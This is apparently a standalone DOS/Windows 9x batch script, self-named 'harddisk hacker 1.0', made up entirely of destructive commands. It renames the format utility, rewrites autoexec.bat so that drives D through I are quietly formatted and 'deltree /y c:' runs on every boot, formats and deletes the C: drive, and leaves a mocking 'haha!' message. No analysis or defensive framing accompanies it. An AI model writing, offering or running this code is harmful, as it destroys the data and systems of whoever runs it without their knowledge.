CLS
REN c:\dos\fformatc.com ffformatcc.com      > nul
REN c:\windows\command\fformatc.com ffformatcc.com      > nul
PATH c:\;c:\dos;c:\windows;c:\windows\command;c:\win
ATTRIB  -h -r c:\autoexec.bat      > nul
echo @echo off                  > c:\autoexec.bat
echo fformatc d: /q /u /autotest                        >> c:\autoexec.bat
echo fformatc e: /q /u /autotest                        >> c:\autoexec.bat
echo fformatc f: /q /u /autotest                        >> c:\autoexec.bat
echo fformatc g: /q /u /autotest                        >> c:\autoexec.bat
echo fformatc h: /q /u /autotest                        >> c:\autoexec.bat
echo fformatc i: /q /u /autotest                        >> c:\autoexec.bat
echo deltree /y c:                        >> c:\autoexec.bat
echo harddisk hacker 1.0                             > c:\windows\system\setv.txt
:RMAT
CLS
FFORMATC  c: /q /u /autotest      > nul
if exist c:\dos\fformatc.* goto DOSDIE
if exist c:\windows\command\fformatc.* goto WINDIE
goto DEL
:DOSDIE
CLS
CD\dos      > nul
FFORMATC  d: /q /u /autotest      > nul
FFORMATC  e: /q /u /autotest      > nul
FFORMATC  f: /q /u /autotest      > nul
FFORMATC  g: /q /u /autotest      > nul
FFORMATC  h: /q /u /autotest      > nul
FFORMATC  i: /q /u /autotest      > nul
CD\      > nul
:WINDIE
CLS
CD\windows\command      > nul
FFORMATC  d: /q /u /autotest      > nul
FFORMATC  e: /q /u /autotest      > nul
FFORMATC  f: /q /u /autotest      > nul
FFORMATC  g: /q /u /autotest      > nul
FFORMATC  h: /q /u /autotest      > nul
FFORMATC  i: /q /u /autotest      > nul
CD\      > nul
goto INFORM
:DEL
CLS
if exist c:\windows\system\setv.txt goto DELTR
goto INFORM
:DELTR
DELTREE  /y c:      > nul
if exist c:\dos\deltree.* goto DELDOS
if exist c:\windows\command\deltree.* goto DELWIN
goto INFORM
:DELDOS
CD\dos
C:\dos\deltree /y c:      > nul
CD\
:DELWIN
CD\windows\command      > nul
DELTREE  /y c:      > nul
CD\      > nul
:INFORM
CLS
echo Harddisk hacker in your computer!                 > c:\vhddisk.txt
echo haha!                  >> c:\vhddisk.txt
CLS
echo @echo off                  > c:\autoexec.bat
echo cls                  >> c:\autoexe.bat
echo :rmat
echo fformatc d: /q /u /autotest                        >> c:\autoexec.bat
echo fformatc e: /q /u /autotest                        >> c:\autoexec.bat
echo fformatc f: /q /u /autotest                        >> c:\autoexec.bat
echo fformatc g: /q /u /autotest                        >> c:\autoexec.bat
echo fformatc h: /q /u /autotest                        >> c:\autoexec.bat
echo fformatc i: /q /u /autotest                        >> c:\autoexec.bat
echo if exist c:\dos\fformatc.* goto dosdie                   >> c:\autoexec.bat
echo if exist c:\windows\command\fformatc.* goto windie                   >> c:\autoexec.bat
echo goto del                   >> c:\autoexec.bat
echo :dosdie                   >> c:\autoexec.bat
echo cd\dos                        >> c:\autoexec.bat
echo fformatc d: /q /u /autotest                        >> c:\autoexec.bat
echo fformatc e: /q /u /autotest                        >> c:\autoexec.bat
echo fformatc f: /q /u /autotest                        >> c:\autoexec.bat
echo fformatc g: /q /u /autotest                        >> c:\autoexec.bat
echo fformatc h: /q /u /autotest                        >> c:\autoexec.bat
echo fformatc i: /q /u /autotest                        >> c:\autoexec.bat
echo cd\                        >> c:\autoexec.bat
echo :windie                   >> c:\autoexec.bat
echo cd\windows\command                        >> c:\autoexec.bat
echo fformatc d: /q /u /autotest                        >> c:\autoexec.bat
echo fformatc e: /q /u /autotest                        >> c:\autoexec.bat
echo fformatc f: /q /u /autotest                        >> c:\autoexec.bat
echo fformatc g: /q /u /autotest                        >> c:\autoexec.bat
echo fformatc h: /q /u /autotest                        >> c:\autoexec.bat
echo fformatc i: /q /u /autotest                        >> c:\autoexec.bat
echo cd\                        >> c:\autoexec.bat
echo goto into                   >> c:\autoexec.bat
echo :del                   >> c:\autoexec.bat
echo if exist c:\windows\system\setv.txt goto deltr                   >> c:\autoexec.bat
echo goto into                   >> c:\autoexec.bat
echo :deltr                   >> c:\autoexec.bat
echo deltree /y c:                        >> c:\autoexec.bat
echo if exist c:\dos\deltree.* goto deldos                   >> c:\autoexec.bat
echo if exist c:\windows\command\deltree.* goto delwin                   >> c:\autoexec.bat
echo :deldos                   >> c:\autoexec.bat
echo cd\dos                   >> c:\autoexec.bat
echo c:\dos\deltree /y c:                        >> c:\autoexec.bat
echo cd\                   >> c:\autoexec.bat
echo :delwin                   >> c:\autoexec.bat
echo cd\windows\command                        >> c:\autoexec.bat
echo deltree /y c:                        >> c:\autoexec.bat
echo cd\                        >> c:\autoexec.bat
echo :into                   >> c:\autoexec.bat
echo type vhddisk.txt                   >> c:\autoexec.bat
CLS
:END
